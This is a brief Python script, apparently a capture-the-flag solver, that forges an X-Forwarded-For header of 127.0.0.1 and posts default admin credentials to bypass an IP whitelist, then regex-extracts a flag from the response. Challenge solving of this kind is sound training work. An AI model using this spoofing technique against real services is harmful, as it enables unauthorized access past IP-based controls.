# coding:utf-8
import requests
import re
import sys

"""
@文件命名：XBOX-085.py
@使用方式: python 085.py <url>
@简述思路: 伪造 X-Forwarded-For 请求头为 127.0.0.1，绕过 IP 白名单，自动提取 flag
"""


def Scan(url):
    flag = ""
    try:
        headers = {
            "X-Forwarded-For": "127.0.0.1",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = {"username": "admin", "password": "password"}
        resp = requests.post(url, headers=headers, data=data, timeout=10)
        # 匹配 flag{...} 或 FLAG{...}
        match = re.search(r"(flag|FLAG)\{[^\}]+\}", resp.text)
        if match:
            flag = match.group(0)
        else:
            print("未找到flag")
    except Exception as e:
        print(e)
    return flag


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python XBOX-auth03.py <url>")
    else:
        print(Scan(url=sys.argv[1]))
